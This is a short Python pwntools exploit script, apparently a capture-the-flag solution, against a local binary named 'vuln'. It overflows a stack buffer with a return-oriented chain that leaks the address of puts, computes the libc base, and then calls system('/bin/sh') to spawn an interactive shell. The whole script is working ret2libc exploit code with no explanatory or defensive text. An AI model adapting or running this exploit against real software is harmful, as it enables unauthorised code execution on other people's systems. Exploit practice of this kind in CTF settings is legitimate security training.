from pwn import *
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def un64(data):
    return int(data[::-1].encode("hex"),16)


#def main():
off = 72
puts_got = 0x000000601018
puts_plt = 0x00000000004005f0
main = 0x00000000004007e8

pop_rdi = 0x00000000004008c3

p = "A" * off
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)
r = process("./vuln")
#gdb.attach(r)
r.sendlineafter("\n",p)
leak_puts = un64(r.recv(8).replace("\n",'').replace("W",""))
log.info("leak puts : " + hex(leak_puts))
libc_base = leak_puts - libc.symbols['puts']
libc_sys = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search("/bin/sh").next()
log.info("system() : " + hex(libc_sys))
log.info("/bin/sh  : " + hex(libc_binsh))

q = "A" * off
q += p64(pop_rdi)
q += p64(libc_binsh)
q += p64(libc_sys)
#q += p64(main)
q += p64(pop_rdi)
q += p64(libc_binsh)
q += p64(libc_sys)

r.sendline(q)
r.interactive()
# if __name__ == '__main__':
# 	main()